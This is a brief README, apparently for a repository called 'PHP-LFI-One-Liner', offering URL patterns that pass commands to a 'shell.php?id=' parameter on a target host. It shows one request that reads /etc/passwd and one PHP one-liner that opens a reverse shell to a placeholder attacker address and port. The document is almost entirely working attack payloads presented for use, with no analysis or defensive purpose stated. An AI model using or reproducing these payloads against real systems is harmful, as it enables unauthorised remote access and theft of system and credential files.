# PHP-LFI-One-Liner
Simple one-liner to execute remote code on a system

http://<ip>/shell.php?id=<remote code>
  
# Example

# Dump Password file

http://<ip>/shell.php?id=/etc/passwd
  
# Reverse Shell (PHP)

http://<ip>/shell.php?id=php -r '$sock=fsockopen("<reverse_ip>",<port>);exec("/bin/sh -i <&3 >&3 2>&3");'
